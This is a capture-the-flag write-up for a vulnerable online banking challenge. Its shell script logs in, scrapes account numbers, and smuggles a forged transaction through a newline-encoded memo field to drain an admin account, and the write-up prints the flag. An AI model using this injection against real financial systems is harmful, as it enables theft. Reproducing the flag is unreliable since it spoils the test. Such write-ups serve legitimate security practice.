# Modern Banking

Author: `Carcharodon`

Our local bank has been hearing about this fancy new thing called the internet for a while. While they still think it's a bit too new to spend too much effort on, they've decided to make an online banking site. And what better language than the language the rest of the bank's services are written in?

## Dev Notes

Request smuggling

## Solution

```sh
#!/bin/sh

# Transactions are processed in batches, and are placed in a newline-delimited file before being processed
# The URL decode function allows translating "%0A" into a newline to make a new transaction from an account the user doesn't own

username="asdf"
password="asdf"
url="http://localhost:8000"

curl -s "$url?page=register" --data-raw "action=register&username=$username&password=$password" >/dev/null
cookie="$(curl -v "$url?page=login" --data-raw "action=login&username=$username&password=$password" 2>&1 | grep Set-Cookie | cut -d' ' -f3)"

account="$(curl "$url?page=home" -b "$cookie" | grep "<tr><td>" | head -n1 | cut -d'>' -f3)"
if [ -z "$account" ]; then
  curl -s "$url?page=manage" -b "$cookie" --data-raw "action=new" >/dev/null
  account="$(curl "$url?page=home" -b "$cookie" | grep "<tr><td>" | head -n1 | cut -d'>' -f3)"
fi

admin_account="$(curl "$url?page=admin" -b "$cookie" | grep "<tr><td>" | head -n1 | cut -d'>' -f3)"

curl -s "$url?page=transact" -b "$cookie" --data-raw "action=send&send_account=1&receive_account=$account&amount=1.00&memo=%0A$admin_account $account 00000000999999999999 :)" >/dev/null

while true; do
  curl -s "$url?page=flag" -b "$cookie" --data-raw "action=buy&account=1" | grep gigem && break
  sleep 5
done

```

flag:
`gigem{C08OL_W45_N0ugHt_1MmuN3}`
